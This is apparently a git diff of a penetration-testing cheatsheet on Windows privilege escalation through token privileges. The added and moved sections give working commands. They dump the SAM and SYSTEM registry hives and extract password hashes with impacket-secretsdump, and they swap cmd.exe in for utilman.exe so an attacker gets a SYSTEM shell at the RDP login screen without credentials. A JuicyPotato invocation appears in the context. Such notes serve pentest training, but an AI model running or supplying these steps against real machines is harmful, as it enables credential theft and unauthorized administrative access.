@@ -326,19 +326,28 @@ JuicyPotato.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}/{4991d34b-80a
 ```
 ### Token Abuse
 Full token privileges cheatsheet at https://github.com/gtworek/Priv2Admin
-##### SeRestorePrivilege To System
-SeRestorePrivilege permission required
-
-GUI Version:
+##### SeBackupPrivilege
 ```
+windows: reg save HKLM\SAM C:\users\public\SAM
+windows: reg save HKLM\SYSTEM C:\users\public\SYSTEM
+
+copy sam and system to kali
+
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+```
+##### SeRestorePrivilege To System
+```
+GUI Version:
+
 .\EnableSeRestorePrivilege.ps1 (Enable SeRestore)
 mv C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
 mv C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
 Kali: rdesktop victom_ip
 Kali: win+U to skip credential input
 ```
-Terminal Version:
 ```
+Terminal Version:
+
 .\EnableSeRestorePrivilege.ps1 (Enable SeRestore)
 reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\seclogon
 cmd.exe /c sc qc seclogon
